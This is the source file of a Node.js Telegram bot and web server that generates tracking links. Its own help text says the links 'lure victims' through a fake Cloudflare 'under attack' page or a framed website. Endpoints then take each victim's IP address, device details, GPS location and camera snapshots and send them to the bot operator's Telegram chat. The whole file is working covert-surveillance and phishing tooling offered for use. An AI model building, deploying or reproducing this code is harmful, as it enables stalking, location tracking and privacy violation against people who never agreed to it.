require('dotenv').config();
const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const mic = require('mic'); // Added for audio recording
const bot = new TelegramBot(process.env["bot"], { polling: true });
var jsonParser = bodyParser.json({ limit: 1024 * 1024 * 20, type: 'application/json' });
var urlencodedParser = bodyParser.urlencoded({ extended: true, limit: 1024 * 1024 * 20, type: 'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

// Modify your URL here
var hostURL = process.env.HOST_URL || "https://486db621-cd22-45e1-bc48-c422fa257026-00-2kqe71mb2qv2o.pike.replit.dev/";
// TOGGLE for Shorters
var use1pt = false;

app.get("/w/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path != null) {
        res.render("webview", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
    } else {
        res.redirect("https://t.me/alexescrowteam");
    }
});

app.get("/c/:path/:uri", (req, res) => {
    var ip;
    var d = new Date();
    d = d.toJSON().slice(0, 19).replace('T', ':');
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (req.params.path != null) {
        res.render("cloudflare", { ip: ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
    } else {
        res.redirect("https://t.me/alexescrowteam");
    }
});

// New endpoint for recording and sending audio
app.post("/recordAudio", (req, res) => {
    const uid = decodeURIComponent(req.body.uid) || null;
    if (!uid) {
        return res.status(400).send("UID is required");
    }

    // Configure the microphone
    const micInstance = mic({
        rate: '16000',
        channels: '1',
        debug: false,
        exitOnSilence: 6,
        fileType: 'wav'
    });

    const micInputStream = micInstance.getAudioStream();
    const outputFileStream = fs.createWriteStream(`audio_${Date.now()}.wav`);

    micInputStream.pipe(outputFileStream);

    // Start recording
    micInstance.start();

    // Stop recording after 2 seconds
    setTimeout(() => {
        micInstance.stop();
        console.log("Recording stopped");

        // Read the recorded file and send it via Telegram
        fs.readFile(outputFileStream.path, (err, data) => {
            if (err) {
                console.error("Error reading audio file:", err);
                return res.status(500).send("Error processing audio");
            }

            // Send the audio file via Telegram
            bot.sendAudio(parseInt(uid, 36), data, {
                filename: "audio_recording.wav",
                contentType: 'audio/wav'
            }).then(() => {
                // Delete the file after sending
                fs.unlink(outputFileStream.path, (err) => {
                    if (err) console.error("Error deleting audio file:", err);
                });
                res.send("Audio recorded and sent successfully");
            }).catch((error) => {
                console.error("Error sending audio:", error);
                res.status(500).send("Error sending audio");
            });
        });
    }, 2000); // 2 seconds
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;

    if (msg?.reply_to_message?.text == "🌐 Enter Your URL") {
        createLink(chatId, msg.text);
    }

    if (msg.text == "/start") {
        var m = {
            reply_markup: JSON.stringify({ "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]] })
        };

        bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`, m);
    }
    else if (msg.text == "/create") {
        createNew(chatId);
    }
    else if (msg.text == "/help") {
        bot.sendMessage(chatId, `Through this bot you can track people just by sending a simple link.\n\nSend /create to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving the url it will send you 2 links which you can use to track people.\n\nSpecifications.\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.\n( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )\n\nOWNER AND CREATED BY:-@alexbreached`);
    }
});

bot.on('callback_query', async function onCallbackQuery(callbackQuery) {
    bot.answerCallbackQuery(callbackQuery.id);
    if (callbackQuery.data == "crenew") {
        createNew(callbackQuery.message.chat.id);
    }
});

bot.on('polling_error', (error) => {
    console.log(error.code);
});

async function createLink(cid, msg) {
    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
        var url = cid.toString(36) + '/' + btoa(msg);
        var m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [[{ text: "Create new Link", callback_data: "crenew" }]]
            })
        };

        var cUrl = `${hostURL}/c/${url}`;
        var wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");
        if (use1pt) {
            var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
            var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

            var f = "", g = "";

            for (var c in x) {
                f += x[c] + "\n";
            }

            for (var c in y) {
                g += y[c] + "\n";
            }

            bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`, m);
        }
        else {
            bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${cUrl}\n\n🌐 WebView Page Link\n${wUrl}`, m);
        }
    }
    else {
        bot.sendMessage(cid, `⚠️ Please Enter a valid URL , including http or https.`);
        createNew(cid);
    }
}

function createNew(cid) {
    var mk = {
        reply_markup: JSON.stringify({ "force_reply": true })
    };
    bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

app.get("/", (req, res) => {
    var ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }
    res.json({ "ip": ip });
});

app.post("/location", (req, res) => {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;
    if (lon != null && lat != null && uid != null && acc != null) {
        bot.sendLocation(parseInt(uid, 36), lat, lon);
        bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
        res.send("Done");
    }
});

app.post("/", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var data = decodeURIComponent(req.body.data) || null;
    var ip;
    if (req.headers['x-forwarded-for']) {
        ip = req.headers['x-forwarded-for'].split(",")[0];
    } else if (req.connection && req.connection.remoteAddress) {
        ip = req.connection.remoteAddress;
    } else {
        ip = req.ip;
    }

    if (uid != null && data != null) {
        if (data.indexOf(ip) < 0) {
            return res.send("ok");
        }

        data = data.replaceAll("<br>", "\n");
        data += "\n\n👨‍💻 OWNER AND CREATED BY:-@alexbreached";

        bot.sendMessage(parseInt(uid, 36), data, { parse_mode: "HTML" });
        res.send("Done");
    }
});

app.post("/camsnap", (req, res) => {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;

    if (uid != null && img != null) {
        var buffer = Buffer.from(img, 'base64');
        var info = {
            filename: "camsnap.png",
            contentType: 'image/png'
        };

        try {
            bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
        } catch (error) {
            console.log(error);
        }

        res.send("Done");
    }
});

app.listen(process.env.PORT || 5000, "0.0.0.0", () => {
    console.log(`App Running on Port ${process.env.PORT || 5000}!`);
    console.log("Created by Anshu(Alex)");
});
